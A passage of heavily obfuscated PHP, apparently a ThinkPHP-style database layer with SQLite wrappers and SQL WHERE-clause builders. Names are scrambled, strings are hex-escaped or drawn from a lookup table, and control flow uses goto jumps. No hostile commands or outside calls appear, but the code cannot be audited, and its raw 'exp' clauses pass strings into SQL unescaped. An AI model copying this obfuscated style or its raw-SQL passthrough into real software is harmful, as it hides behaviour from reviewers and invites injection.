array_to_keyvalue_group($f‰ËÔßµ³æ, $Dš×ª‰×¾Í[1732]); foreach ($f‰ËÔßµ³æ as $c¸ÇŠå‚•Ö => $b•¿äë’¹µ) { $DÇğ”ö¶ à = array(); foreach ($b•¿äë’¹µ as $f‹š’·Ş‰Å) { $DÇğ”ö¶ à[$f‹š’·Ş‰Å[$Dš×ª‰×¾Í[93]]] = $f‹š’·Ş‰Å[$Dš×ª‰×¾Í[372]]; } $f‰ËÔßµ³æ[$c¸ÇŠå‚•Ö] = $DÇğ”ö¶ à; } goto döèÌ¶µŸÉ; AÔ£¼Ò˜Í: } } goto EÓ¨ÒÎ…; Eª¹¿Ö†ë©: class DbSqlite extends DbSqliteBase { public function query($AºÊñ’ˆ¶Ó) { $B–Ïğ¢ñ¡ =& $_SERVER[«¾°Ã¤]; if (!CacheLock::fileLock($B–Ïğ¢ñ¡[9])) { return !1; } $c Õº°İî¾ = parent::query($AºÊñ’ˆ¶Ó); CacheLock::fileUnLock($B–Ïğ¢ñ¡[9]); return $c Õº°İî¾; } public function execute($eŒ¯áäÒªÀ) { $BÃ¦¨ˆ½êš =& $_SERVER[«¾°Ã¤]; if (!CacheLock::fileLock($BÃ¦¨ˆ½êš[9])) { return !1; } $cŒ™ªƒÈ¢ = parent::execute($eŒ¯áäÒªÀ); CacheLock::fileUnLock($BÃ¦¨ˆ½êš[9]); return $cŒ™ªƒÈ¢; } } class DbSqlite3 extends DbSqlite3Base { public function query($AŠá‹«†¹×) { $e¡‘ëöò¦… =& $_SERVER[«¾°Ã¤]; if (!CacheLock::fileLock($e¡‘ëöò¦…[9])) { return !1; } $d²”Ã”äÌ = parent::query($AŠá‹«†¹×); CacheLock::fileUnLock($e¡‘ëöò¦…[9]); return $d²”Ã”äÌ; } public function execute($eààºÈÇ‹¢) { $D†…ÀÁÓĞ =& $_SERVER[«¾°Ã¤]; if (!CacheLock::fileLock($D†…ÀÁÓĞ[9])) { return !1; } $d©¼¶œˆµÂ = parent::execute($eààºÈÇ‹¢); CacheLock::fileUnLock($D†…ÀÁÓĞ[9]); return $d©¼¶œˆµÂ; } } class Db { protected $dbType = null; protected $autoFree = false; protected $model = "\137\x74\150\151\x6e\153\x5f"; protected $pconnect = false; protected $queryStr = ''; protected $modelSql = array(); protected $lastInsID = null; protected $numRows = 0; protected $numCols = 0; protected $transTimes = 0; protected $error = ''; protected $linkID = array(); protected $_linkID = null; protected $queryID = null; protected $connected = false; protected $config = ''; protected $configLast = ''; protected $exp = array("\145\x71" => "\75", "\x6e\145\x71" => "\74\76", "\147\164" => "\76", "\x65\147\164" => "\76\x3d", "\154\164" => "\x3c", "\x65\154\x74" => "\74\75", "\156\157\x74\154\x69\x6b\x65" => "\x4e\117\x54\x20\x4c\111\x4b\x45", "\x6c\x69\x6b\145" => "\x4c\111\113\105", "\151\156" => "\x49\x4e", "\x6e\x6f\164\x69\156" => "\116\x4f\124\x20\111\x4e", "\x6e\x6f\x74\40\x69\x6e" => "\116\117\124\x20\x49\x4e", "\x62\145\x74\x77\x65\145\156" => "\102\105\124\x57\x45\x45\x4e", "\x6e\x6f\164\142\145\164\x77\145\x65\x6e" => "\116\117\124\x20\102\105\124\127\105\x45\116", "\x6e\157\x74\40\x62\x65\164\167\145\x65\x6e" => "\116\x4f\124\40\102\x45\124\x57\105\x45\116"); protected $selectSql = "\x53\105\x4c\x45\x43\124\45\x44\x49\123\124\x49\116\x43\124\45\40\45\x46\111\105\x4c\104\45\x20\106\122\x4f\115\40\x25\124\101\102\114\105\x25\45\x4a\117\111\x4e\45\x25\x57\110\105\122\x45\45\45\x47\x52\x4f\125\x50\x25\45\110\101\126\111\116\107\45\x25\117\x52\x44\105\122\x25\x25\x4c\x49\115\111\124\x25\x20\x25\x55\116\111\x4f\x4e\x25\x25\103\117\115\x4d\x45\116\124\45"; protected $bind = array(); public static function getInstance() { $AÊäçøÑ÷£ = func_get_args(); return think_get_instance_of(__CLASS__, $_SERVER[«¾°Ã¤][920], $AÊäçøÑ÷£); } public function factory($C”ó÷â¬½Ê = '') { goto CÎ†´áñ£ƒ; bÅç±±ºÇ¾: return $c‚Å©¯´¡”; goto bª¤ôÓÈÔî; BˆÑ»éµ“: $this->dbType = ucwords(strtolower($C”ó÷â¬½Ê[$fÚ×Ó´œ‹[921]])); $d«ŒØÂÏÌƒ = $fÚ×Ó´œ‹[923] . $this->dbType; if (class_exists($d«ŒØÂÏÌƒ)) { $c‚Å©¯´¡” = new $d«ŒØÂÏÌƒ($C”ó÷â¬½Ê); if ($fÚ×Ó´œ‹[764] != strtolower($C”ó÷â¬½Ê[$fÚ×Ó´œ‹[921]])) { $c‚Å©¯´¡”->dbType = strtoupper($this->dbType); } else { $c‚Å©¯´¡”->dbType = $this->_getDsnType($C”ó÷â¬½Ê[$fÚ×Ó´œ‹[876]]); } } else { think_exception(think_lang($fÚ×Ó´œ‹[924]) . $fÚ×Ó´œ‹[925] . $d«ŒØÂÏÌƒ); } goto bÅç±±ºÇ¾; CÎ†´áñ£ƒ: $fÚ×Ó´œ‹ =& $_SERVER[«¾°Ã¤]; $C”ó÷â¬½Ê = $this->parseConfig($C”ó÷â¬½Ê); if (empty($C”ó÷â¬½Ê[$fÚ×Ó´œ‹[921]])) { think_exception(think_lang($fÚ×Ó´œ‹[922])); } goto BˆÑ»éµ“; bª¤ôÓÈÔî: } public function __call($c³ì†îéÂå, $f·‡ÙÌê•Œ) { if (method_exists($this, $c³ì†îéÂå)) { return call_user_func_array(array($this, $c³ì†îéÂå), $f·‡ÙÌê•Œ); } } protected function _getDsnType($F¬Ö¦¤¥) { $d·®ÊíÍ™Ñ = explode($_SERVER[«¾°Ã¤][4], $F¬Ö¦¤¥); $EÑãˆëŒìÚ = strtoupper(trim($d·®ÊíÍ™Ñ[0])); return $EÑãˆëŒìÚ; } private function parseConfig($Eãƒ‹¤ÌÖ = '') { $bóÁÀï½İ =& $_SERVER[«¾°Ã¤]; if (!empty($Eãƒ‹¤ÌÖ) && is_string($Eãƒ‹¤ÌÖ)) { $Eãƒ‹¤ÌÖ = $this->parseDSN($Eãƒ‹¤ÌÖ); } elseif (is_array($Eãƒ‹¤ÌÖ)) { $Eãƒ‹¤ÌÖ = array_change_key_case($Eãƒ‹¤ÌÖ); $Eãƒ‹¤ÌÖ = array($bóÁÀï½İ[921] => $Eãƒ‹¤ÌÖ[$bóÁÀï½İ[763]], $bóÁÀï½İ[849] => $Eãƒ‹¤ÌÖ[$bóÁÀï½İ[926]], $bóÁÀï½İ[850] => $Eãƒ‹¤ÌÖ[$bóÁÀï½İ[927]], $bóÁÀï½İ[847] => $Eãƒ‹¤ÌÖ[$bóÁÀï½İ[928]], $bóÁÀï½İ[848] => $Eãƒ‹¤ÌÖ[$bóÁÀï½İ[929]], $bóÁÀï½İ[17] => $Eãƒ‹¤ÌÖ[$bóÁÀï½İ[930]], $bóÁÀï½İ[876] => $Eãƒ‹¤ÌÖ[$bóÁÀï½İ[765]], $bóÁÀï½İ[13] => isset($Eãƒ‹¤ÌÖ[$bóÁÀï½İ[931]]) ? $Eãƒ‹¤ÌÖ[$bóÁÀï½İ[931]] : array()); } elseif (empty($Eãƒ‹¤ÌÖ)) { if (think_config($bóÁÀï½İ[932]) && $bóÁÀï½İ[764] != strtolower(think_config($bóÁÀï½İ[933]))) { $Eãƒ‹¤ÌÖ = $this->parseDSN(think_config($bóÁÀï½İ[932])); } else { $Eãƒ‹¤ÌÖ = array($bóÁÀï½İ[921] => think_config($bóÁÀï½İ[933]), $bóÁÀï½İ[849] => think_config($bóÁÀï½İ[934]), $bóÁÀï½İ[850] => think_config($bóÁÀï½İ[935]), $bóÁÀï½İ[847] => think_config($bóÁÀï½İ[936]), $bóÁÀï½İ[848] => think_config($bóÁÀï½İ[937]), $bóÁÀï½İ[17] => think_config($bóÁÀï½İ[244]), $bóÁÀï½İ[876] => think_config($bóÁÀï½İ[932]), $bóÁÀï½İ[13] => think_config($bóÁÀï½İ[938])); } } return $Eãƒ‹¤ÌÖ; } protected function initConnect($eÑèÃ¹Ê• = true) { if (1 == think_config($_SERVER[«¾°Ã¤][18])) { $this->_linkID = $this->multiConnect($eÑèÃ¹Ê•); } else { if ($this->config) { $this->configLast = $this->config; } } if (!$this->connected) { $this->_linkID = $this->connect(); } } protected function closeConnect() { if (!$this->connected) { return; } foreach ($this->linkID as $a«ë°³¶±· => $bÄ†„¢ÛÇ) { $this->_linkID = $bÄ†„¢ÛÇ; $this->close(); } $this->linkID = array(); $this->_linkID = null; $this->connected = !1; if (!$this->config && $this->configLast) { $this->config = $this->configLast; } } protected function multiConnect($cÎÙ‘ãÈïˆ = false) { goto C ‘äÛİÃ®; C¥‹˜ÍÛñ¾: if (empty($f¹ÑµÑáêÒ)) { foreach ($this->config as $Eñ¢µä³Áˆ => $CÊÜ§†À…£) { $f¹ÑµÑáêÒ[$Eñ¢µä³Áˆ] = explode($Eßº‰æíì…[47], $CÊÜ§†À…£); } } if (think_config($Eßº‰æíì…[939])) { if ($cÎÙ‘ãÈïˆ) { $cë×ïÂƒ•Ó = floor(mt_rand(0, think_config($Eßº‰æíì…[940]) - 1)); $dŠ¯µ×‹ù² = $cë×ïÂƒ•Ó; } else { if (is_numeric(think_config($Eßº‰æíì…[941]))) { $cë×ïÂƒ•Ó = think_config($Eßº‰æíì…[941]); } else { $cë×ïÂƒ•Ó = floor(mt_rand(think_config($Eßº‰æíì…[940]), count($f¹ÑµÑáêÒ[$Eßº‰æíì…[847]]) - 1)); } } } else { $cë×ïÂƒ•Ó = floor(mt_rand(0, count($f¹ÑµÑáêÒ[$Eßº‰æíì…[847]]) - 1)); $dŠ¯µ×‹ù² = $cë×ïÂƒ•Ó; } $cë×ïÂƒ•Ó = $dŠ¯µ×‹ù² !== -1 ? $dŠ¯µ×‹ù² : $cë×ïÂƒ•Ó; goto bõİÚ²†³›; C ‘äÛİÃ®: $Eßº‰æíì… =& $_SERVER[«¾°Ã¤]; static $f¹ÑµÑáêÒ = array(); static $dŠ¯µ×‹ù² = -1; goto C¥‹˜ÍÛñ¾; bõİÚ²†³›: $Cì¯Í·ÖŠƒ = array($Eßº‰æíì…[849] => isset($f¹ÑµÑáêÒ[$Eßº‰æíì…[849]][$cë×ïÂƒ•Ó]) ? $f¹ÑµÑáêÒ[$Eßº‰æíì…[849]][$cë×ïÂƒ•Ó] : $f¹ÑµÑáêÒ[$Eßº‰æíì…[849]][0], $Eßº‰æíì…[850] => isset($f¹ÑµÑáêÒ[$Eßº‰æíì…[850]][$cë×ïÂƒ•Ó]) ? $f¹ÑµÑáêÒ[$Eßº‰æíì…[850]][$cë×ïÂƒ•Ó] : $f¹ÑµÑáêÒ[$Eßº‰æíì…[850]][0], $Eßº‰æíì…[847] => isset($f¹ÑµÑáêÒ[$Eßº‰æíì…[847]][$cë×ïÂƒ•Ó]) ? $f¹ÑµÑáêÒ[$Eßº‰æíì…[847]][$cë×ïÂƒ•Ó] : $f¹ÑµÑáêÒ[$Eßº‰æíì…[847]][0], $Eßº‰æíì…[848] => isset($f¹ÑµÑáêÒ[$Eßº‰æíì…[848]][$cë×ïÂƒ•Ó]) ? $f¹ÑµÑáêÒ[$Eßº‰æíì…[848]][$cë×ïÂƒ•Ó] : $f¹ÑµÑáêÒ[$Eßº‰æíì…[848]][0], $Eßº‰æíì…[17] => isset($f¹ÑµÑáêÒ[$Eßº‰æíì…[17]][$cë×ïÂƒ•Ó]) ? $f¹ÑµÑáêÒ[$Eßº‰æíì…[17]][$cë×ïÂƒ•Ó] : $f¹ÑµÑáêÒ[$Eßº‰æíì…[17]][0], $Eßº‰æíì…[876] => isset($f¹ÑµÑáêÒ[$Eßº‰æíì…[876]][$cë×ïÂƒ•Ó]) ? $f¹ÑµÑáêÒ[$Eßº‰æíì…[876]][$cë×ïÂƒ•Ó] : $f¹ÑµÑáêÒ[$Eßº‰æíì…[876]][0], $Eßº‰æíì…[13] => isset($f¹ÑµÑáêÒ[$Eßº‰æíì…[13]][$cë×ïÂƒ•Ó]) ? $f¹ÑµÑáêÒ[$Eßº‰æíì…[13]][$cë×ïÂƒ•Ó] : $f¹ÑµÑáêÒ[$Eßº‰æíì…[13]][0]); return $this->connect($Cì¯Í·ÖŠƒ, $cë×ïÂƒ•Ó); goto FôÒÊ¥¹òŒ; FôÒÊ¥¹òŒ: } public function parseDSN($a³ä’äÖÀ) { $Cìæá‘³æ¼ =& $_SERVER[«¾°Ã¤]; if (empty($a³ä’äÖÀ)) { return !1; } $aÊ–É¤¡­à = parse_url($a³ä’äÖÀ); if ($aÊ–É¤¡­à[$Cìæá‘³æ¼[174]]) { $dÛİÏˆ‡•Ñ = array($Cìæá‘³æ¼[921] => $aÊ–É¤¡­à[$Cìæá‘³æ¼[174]], $Cìæá‘³æ¼[849] => isset($aÊ–É¤¡­à[$Cìæá‘³æ¼[571]]) ? $aÊ–É¤¡­à[$Cìæá‘³æ¼[571]] : $Cìæá‘³æ¼[33], $Cìæá‘³æ¼[850] => isset($aÊ–É¤¡­à[$Cìæá‘³æ¼[942]]) ? $aÊ–É¤¡­à[$Cìæá‘³æ¼[942]] : $Cìæá‘³æ¼[33], $Cìæá‘³æ¼[847] => isset($aÊ–É¤¡­à[$Cìæá‘³æ¼[175]]) ? $aÊ–É¤¡­à[$Cìæá‘³æ¼[175]] : $Cìæá‘³æ¼[33], $Cìæá‘³æ¼[848] => isset($aÊ–É¤¡­à[$Cìæá‘³æ¼[176]]) ? $aÊ–É¤¡­à[$Cìæá‘³æ¼[176]] : $Cìæá‘³æ¼[33], $Cìæá‘³æ¼[17] => isset($aÊ–É¤¡­à[$Cìæá‘³æ¼[76]]) ? substr($aÊ–É¤¡­à[$Cìæá‘³æ¼[76]], 1) : $Cìæá‘³æ¼[33]); } else { preg_match($Cìæá‘³æ¼[943], trim($a³ä’äÖÀ), $BÀÕÆ·¡ê„); $dÛİÏˆ‡•Ñ = array($Cìæá‘³æ¼[921] => $BÀÕÆ·¡ê„[1], $Cìæá‘³æ¼[849] => $BÀÕÆ·¡ê„[2], $Cìæá‘³æ¼[850] => $BÀÕÆ·¡ê„[3], $Cìæá‘³æ¼[847] => $BÀÕÆ·¡ê„[4], $Cìæá‘³æ¼[848] => $BÀÕÆ·¡ê„[5], $Cìæá‘³æ¼[17] => $BÀÕÆ·¡ê„[6]); } $dÛİÏˆ‡•Ñ[$Cìæá‘³æ¼[876]] = $Cìæá‘³æ¼[33]; return $dÛİÏˆ‡•Ñ; } protected function debug() { $FÎµ›§½•— =& $_SERVER[«¾°Ã¤]; $this->modelSql[$this->model] = $this->queryStr; $this->model = $FÎµ›§½•—[944]; if (think_config($FÎµ›§½•—[945])) { think_status($FÎµ›§½•—[946]); think_trace($this->queryStr . $FÎµ›§½•—[947] . think_status($FÎµ›§½•—[20], $FÎµ›§½•—[946], 6) . $FÎµ›§½•—[948], $FÎµ›§½•—[33], $FÎµ›§½•—[949]); } } protected function parseLock($a•®²¡ë’æ = false) { $dôÎ¸ùÈË =& $_SERVER[«¾°Ã¤]; if (!$a•®²¡ë’æ) { return $dôÎ¸ùÈË[33]; } if ($dôÎ¸ùÈË[878] == $this->dbType) { return $dôÎ¸ùÈË[950]; } return $dôÎ¸ùÈË[951]; } protected function parseSet($c•ÙÌ¿æ×) { $fùùÜ¬¡Œ =& $_SERVER[«¾°Ã¤]; foreach ($c•ÙÌ¿æ× as $bÕ¸ˆÛÎ¾ => $d×•±Ğó£Û) { if (is_array($d×•±Ğó£Û) && $fùùÜ¬¡Œ[295] == $d×•±Ğó£Û[0]) { $bµÃĞ…ÅÁ[] = $this->parseKey($bÕ¸ˆÛÎ¾) . $fùùÜ¬¡Œ[952] . $d×•±Ğó£Û[1]; } elseif (is_scalar($d×•±Ğó£Û) || is_null($d×•±Ğó£Û)) { $bµÃĞ…ÅÁ[] = $this->parseKey($bÕ¸ˆÛÎ¾) . $fùùÜ¬¡Œ[952] . $this->parseValue($d×•±Ğó£Û); } } return $fùùÜ¬¡Œ[953] . implode($fùùÜ¬¡Œ[47], $bµÃĞ…ÅÁ); } protected function bindParam($aØ¾Ÿ’×®, $a‹¿çŠÍà±) { $this->bind[$_SERVER[«¾°Ã¤][4] . $aØ¾Ÿ’×®] = $a‹¿çŠÍà±; } protected function parseBind($D¸‘ä§¶ƒ‘) { $D¸‘ä§¶ƒ‘ = array_merge($this->bind, $D¸‘ä§¶ƒ‘); $this->bind = array(); return $D¸‘ä§¶ƒ‘; } function parseKey(&$eÌÎˆ±ÃŒİ, $dïÄÊ¡—®³ = true) { if ($dïÄÊ¡—®³) { $eÌÎˆ±ÃŒİ = $this->parseKeyCheck($eÌÎˆ±ÃŒİ); } return $eÌÎˆ±ÃŒİ; } function parseKeyCheck($e¡î£±¼Ì) { $cÁ„ÓğÉ =& $_SERVER[«¾°Ã¤]; $e¡î£±¼Ì = trim($e¡î£±¼Ì); if (!preg_match($cÁ„ÓğÉ[954], $e¡î£±¼Ì)) { think_exception($cÁ„ÓğÉ[955] . $e¡î£±¼Ì); } return $e¡î£±¼Ì; } protected function parseValue($FÍ­Ãİï¸Ï) { $f‚®Á™‚°× =& $_SERVER[«¾°Ã¤]; if (is_string($FÍ­Ãİï¸Ï)) { $FÍ­Ãİï¸Ï = $f‚®Á™‚°×[917] . $this->escapeString($FÍ­Ãİï¸Ï) . $f‚®Á™‚°×[917]; } elseif (isset($FÍ­Ãİï¸Ï[0]) && is_string($FÍ­Ãİï¸Ï[0]) && strtolower($FÍ­Ãİï¸Ï[0]) == $f‚®Á™‚°×[295]) { $FÍ­Ãİï¸Ï = $this->escapeString($FÍ­Ãİï¸Ï[1]); } elseif (is_array($FÍ­Ãİï¸Ï)) { $FÍ­Ãİï¸Ï = array_map(array($this, $f‚®Á™‚°×[918]), $FÍ­Ãİï¸Ï); } elseif (is_bool($FÍ­Ãİï¸Ï)) { $FÍ­Ãİï¸Ï = $FÍ­Ãİï¸Ï ? $f‚®Á™‚°×[87] : $f‚®Á™‚°×[191]; } elseif (is_null($FÍ­Ãİï¸Ï)) { $FÍ­Ãİï¸Ï = $f‚®Á™‚°×[103]; } return $FÍ­Ãİï¸Ï; } protected function parseField($c™íåÌ¢óƒ) { $c¸ì×†Ç» =& $_SERVER[«¾°Ã¤]; if (is_string($c™íåÌ¢óƒ) && strpos($c™íåÌ¢óƒ, $c¸ì×†Ç»[47])) { $c™íåÌ¢óƒ = explode($c¸ì×†Ç»[47], $c™íåÌ¢óƒ); } if (is_array($c™íåÌ¢óƒ)) { $Dµª‘ñ³è¤ = array(); foreach ($c™íåÌ¢óƒ as $aÏÛœÑÁœ™ => $b¸øªšÕš‚) { if (!is_numeric($aÏÛœÑÁœ™)) { $Dµª‘ñ³è¤[] = $this->parseKey($aÏÛœÑÁœ™, !1) . $c¸ì×†Ç»[956] . $this->parseKey($b¸øªšÕš‚); } else { $Dµª‘ñ³è¤[] = $this->parseKey($b¸øªšÕš‚); } } $eéíš·‚Ç = implode($c¸ì×†Ç»[47], $Dµª‘ñ³è¤); } elseif (is_string($c™íåÌ¢óƒ) && !empty($c™íåÌ¢óƒ)) { $eéíš·‚Ç = $c™íåÌ¢óƒ; } else { $eéíš·‚Ç = $c¸ì×†Ç»[182]; } return $eéíš·‚Ç; } protected function parseTable($câˆÀ½©°) { $e÷¨ÖÜÑø¥ =& $_SERVER[«¾°Ã¤]; if (is_array($câˆÀ½©°)) { $F™ÙéÏ««É = array(); foreach ($câˆÀ½©° as $fÌè‹å‘ => $B§å­İ‡Üõ) { if (!is_numeric($fÌè‹å‘)) { $F™ÙéÏ««É[] = $this->parseKey($fÌè‹å‘) . $e÷¨ÖÜÑø¥[50] . $this->parseKey($B§å­İ‡Üõ); } else { $F™ÙéÏ««É[] = $this->parseKey($fÌè‹å‘); } } $câˆÀ½©° = $F™ÙéÏ««É; } elseif (is_string($câˆÀ½©°)) { if (strstr($câˆÀ½©°, $e÷¨ÖÜÑø¥[50])) { return $câˆÀ½©°; } $câˆÀ½©° = explode($e÷¨ÖÜÑø¥[47], $câˆÀ½©°); array_walk($câˆÀ½©°, array($this, $e÷¨ÖÜÑø¥[867])); } return $e÷¨ÖÜÑø¥[861] . trim(implode($e÷¨ÖÜÑø¥[957], $câˆÀ½©°), $e÷¨ÖÜÑø¥[382]) . $e÷¨ÖÜÑø¥[861]; } protected function parseWhere($Aõ÷…¸µ«§) { $DƒöëÚœë‘ =& $_SERVER[«¾°Ã¤]; $dÃÍ …ŒÔ¦ = $DƒöëÚœë‘[33]; if (is_string($Aõ÷…¸µ«§)) { $dÃÍ …ŒÔ¦ = $Aõ÷…¸µ«§; } else { $BÃŒ»Ôë»¹ = isset($Aõ÷…¸µ«§[$DƒöëÚœë‘[958]]) ? strtoupper($Aõ÷…¸µ«§[$DƒöëÚœë‘[958]]) : $DƒöëÚœë‘[33]; if (in_array($BÃŒ»Ôë»¹, array($DƒöëÚœë‘[959], $DƒöëÚœë‘[960], $DƒöëÚœë‘[961]))) { $BÃŒ»Ôë»¹ = $DƒöëÚœë‘[50] . $BÃŒ»Ôë»¹ . $DƒöëÚœë‘[50]; unset($Aõ÷…¸µ«§[$DƒöëÚœë‘[958]]); } else { $BÃŒ»Ôë»¹ = $DƒöëÚœë‘[962]; } foreach ($Aõ÷…¸µ«§ as $f«ÓÍ„–×˜ => $E÷•ÍõŠõ) { $dÃÍ …ŒÔ¦ .= $DƒöëÚœë‘[275]; if (is_numeric($f«ÓÍ„–×˜)) { $f«ÓÍ„–×˜ = $DƒöëÚœë‘[963]; } if (0 === strpos($f«ÓÍ„–×˜, $DƒöëÚœë‘[71])) { $dÃÍ …ŒÔ¦ .= $this->parseThinkWhere($f«ÓÍ„–×˜, $E÷•ÍõŠõ); } else { if (!preg_match($DƒöëÚœë‘[964], trim($f«ÓÍ„–×˜))) { think_exception(think_lang($DƒöëÚœë‘[965]) . $DƒöëÚœë‘[4] . $f«ÓÍ„–×˜); } $Aõæß±¬‹Í = is_array($E÷•ÍõŠõ) && isset($E÷•ÍõŠõ[$DƒöëÚœë‘[966]]); $f«ÓÍ„–×˜ = trim($f«ÓÍ„–×˜); if (strpos($f«ÓÍ„–×˜, $DƒöëÚœë‘[281])) { $E©„çÁèÁ = explode($DƒöëÚœë‘[281], $f«ÓÍ„–×˜); $Dï÷„•œóª = array(); foreach ($E©„çÁèÁ as $E§‰¸Â±õß => $dñä¡†ò§£) { $F±é÷ˆ¡Û = $Aõæß±¬‹Í ? $E÷•ÍõŠõ[$E§‰¸Â±õß] : $E÷•ÍõŠõ; $Dï÷„•œóª[] = $DƒöëÚœë‘[258] . $this->parseWhereItem($this->parseKey($dñä¡†ò§£), $F±é÷ˆ¡Û) . $DƒöëÚœë‘[866]; } $dÃÍ …ŒÔ¦ .= implode($DƒöëÚœë‘[967], $Dï÷„•œóª); } elseif (strpos($f«ÓÍ„–×˜, $DƒöëÚœë‘[282])) { $E©„çÁèÁ = explode($DƒöëÚœë‘[282], $f«ÓÍ„–×˜); $Dï÷„•œóª = array(); foreach ($E©„çÁèÁ as $E§‰¸Â±õß => $dñä¡†ò§£) { $F±é÷ˆ¡Û = $Aõæß±¬‹Í ? $E÷•ÍõŠõ[$E§‰¸Â±õß] : $E÷•ÍõŠõ; $Dï÷„•œóª[] = $DƒöëÚœë‘[258] . $this->parseWhereItem($this->parseKey($dñä¡†ò§£), $F±é÷ˆ¡Û) . $DƒöëÚœë‘[866]; } $dÃÍ …ŒÔ¦ .= implode($DƒöëÚœë‘[962], $Dï÷„•œóª); } else { $dÃÍ …ŒÔ¦ .= $this->parseWhereItem($this->parseKey($f«ÓÍ„–×˜), $E÷•ÍõŠõ); } } $dÃÍ …ŒÔ¦ .= $DƒöëÚœë‘[276] . $BÃŒ»Ôë»¹; } $dÃÍ …ŒÔ¦ = substr($dÃÍ …ŒÔ¦, 0, -strlen($BÃŒ»Ôë»¹)); } return empty($dÃÍ …ŒÔ¦) ? $DƒöëÚœë‘[33] : $DƒöëÚœë‘[968] . $dÃÍ …ŒÔ¦; } protected function parseWhereItem($C‡Œ¯—‚â, $BËè®ÁÈÀ) { $AÏÈ˜£²¦Œ =& $_SERVER[«¾°Ã¤]; $E…”÷…Î = $AÏÈ˜£²¦Œ[33]; if (is_array($BËè®ÁÈÀ)) { if (is_string($BËè®ÁÈÀ[0])) { $DÚ§Ü ª‘ = strtolower($BËè®ÁÈÀ[0]); if (in_array($BËè®ÁÈÀ[0], array($AÏÈ˜£²¦Œ[952], $AÏÈ˜£²¦Œ[969], $AÏÈ˜£²¦Œ[970], $AÏÈ˜£²¦Œ[971], $AÏÈ˜£²¦Œ[972], $AÏÈ˜£²¦Œ[973]))) { $E…”÷…Î .= $C‡Œ¯—‚â . $AÏÈ˜£²¦Œ[50] . $BËè®ÁÈÀ[0] . $AÏÈ˜£²¦Œ[50] . $this->parseValue($BËè®ÁÈÀ[1]); } elseif (preg_match($AÏÈ˜£²¦Œ[974], $BËè®ÁÈÀ[0])) { $E…”÷…Î .= $C‡Œ¯—‚â . $AÏÈ˜£²¦Œ[50] . $this->exp[$DÚ§Ü ª‘] . $AÏÈ˜£²¦Œ[50] . $this->parseValue($BËè®ÁÈÀ[1]); } elseif (preg_match($AÏÈ˜£²¦Œ[975], $BËè®ÁÈÀ[0])) { if (is_array($BËè®ÁÈÀ[1])) { $c¿Şğß©˜° = isset($BËè®ÁÈÀ[2]) ? strtoupper($BËè®ÁÈÀ[2]) : $AÏÈ˜£²¦Œ[960]; if (in_array($c¿Şğß©˜°, array($AÏÈ˜£²¦Œ[959], $AÏÈ˜£²¦Œ[960], $AÏÈ˜£²¦Œ[961]))) { $Aß¸ö = array(); foreach ($BËè®ÁÈÀ[1] as $fŸ»À’ø”‡) { $Aß¸ö[] = $C‡Œ¯—‚â . $AÏÈ˜£²¦Œ[50] . $this->exp[$DÚ§Ü ª‘] . $AÏÈ˜£²¦Œ[50] . $this->parseValue($fŸ»À’ø”‡); } $E…”÷…Î .= $AÏÈ˜£²¦Œ[258] . implode($AÏÈ˜£²¦Œ[50] . $c¿Şğß©˜° . $AÏÈ˜£²¦Œ[50], $Aß¸ö) . $AÏÈ˜£²¦Œ[866]; } } else { $E…”÷…Î .= $C‡Œ¯—‚â . $AÏÈ˜£²¦Œ[50] . $this->exp[$DÚ§Ü ª‘] . $AÏÈ˜£²¦Œ[50] . $this->parseValue($BËè®ÁÈÀ[1]); } } elseif ($AÏÈ˜£²¦Œ[295] == $DÚ§Ü ª‘) { $E…”÷…Î .= $AÏÈ˜£²¦Œ[864] . $C‡Œ¯—‚â . $AÏÈ˜£²¦Œ[50] . $BËè®ÁÈÀ[1] . $AÏÈ˜£²¦Œ[976]; } elseif (preg_match($AÏÈ˜£²¦Œ[977], $BËè®ÁÈÀ[0])) { $E…”÷…Î .= $BËè®ÁÈÀ[0]; } elseif (preg_match($AÏÈ˜£²¦Œ[978], $BËè®ÁÈÀ[0])) { if (isset($BËè®ÁÈÀ[2]) && $AÏÈ˜£²¦Œ[295] == $BËè®ÁÈÀ[2]) { $E…”÷…Î .= $C‡Œ¯—‚â . $AÏÈ˜£²¦Œ[50] . $this->exp[$DÚ§Ü ª‘] . $AÏÈ˜£²¦Œ[50] . $BËè®ÁÈÀ[1]; } else { if (is_string($BËè®ÁÈÀ[1])) { $BËè®ÁÈÀ[1] = explode($AÏÈ˜£²¦Œ[47], $BËè®ÁÈÀ[1]); } $FŒÎµê¾Ë = implode($AÏÈ˜£²¦Œ[47], $this->parseValue($BËè®ÁÈÀ[1])); $E…”÷…Î .= $C‡Œ¯—‚â . $AÏÈ˜£²¦Œ[50] . $this->exp[$DÚ§Ü ª‘] . $AÏÈ˜£²¦Œ[864] . $FŒÎµê¾Ë . $AÏÈ˜£²¦Œ[866]; } } elseif (preg_match($AÏÈ˜£²¦Œ[979], $BËè®ÁÈÀ[0])) { $D‘¯´™ˆ¶Ó = is_string($BËè®ÁÈÀ[1]) ? explode($AÏÈ˜£²¦Œ[47], $BËè®ÁÈÀ[1]) : $BËè®ÁÈÀ[1]; $E…”÷…Î .= $AÏÈ˜£²¦Œ[864] . $C‡Œ¯—‚â . $AÏÈ˜£²¦Œ[50] . $this->exp[$DÚ§Ü ª‘] . $AÏÈ˜£²¦Œ[50] . $this->parseValue($D‘¯´™ˆ¶Ó[0]) . $AÏÈ˜£²¦Œ[962] . $this->parseValue($D‘¯´™ˆ¶Ó[1]) . $AÏÈ˜£²¦Œ[276]; } else { think_exception(think_lang($AÏÈ˜£²¦Œ[965]) . $AÏÈ˜£²¦Œ[4] . $BËè®ÁÈÀ[0]); } } else { $b‰ª¾Ã•ˆæ = count($BËè®ÁÈÀ); $D¾¹¢‡„Ä¶ = $AÏÈ˜£²¦Œ[33]; if (is_string($BËè®ÁÈÀ[$b‰ª¾Ã•ˆæ - 1])) { $D¾¹¢‡„Ä¶ = isset($BËè®ÁÈÀ[$b‰ª¾Ã•ˆæ - 1]) ? strtoupper($BËè®ÁÈÀ[$b‰ª¾Ã•ˆæ - 1]) : $AÏÈ˜£²¦Œ[33]; if (in_array($D¾¹¢‡„Ä¶, array($AÏÈ˜£²¦Œ[959], $AÏÈ˜£²¦Œ[960], $AÏÈ˜£²¦Œ[961]))) { $b‰ª¾Ã•ˆæ = $b‰ª¾Ã•ˆæ - 1; } } else { $D¾¹¢‡„Ä¶ = $AÏÈ˜£²¦Œ[959]; } for ($BŠ»ùº­ñ• = 0; $BŠ»ùº­ñ• < $b‰ª¾Ã•ˆæ; $BŠ»ùº­ñ•++) { $D‘¯´™ˆ¶Ó = is_array($BËè®ÁÈÀ[$BŠ»ùº­ñ•]) ? $BËè®ÁÈÀ[$BŠ»ùº­ñ•][1] : 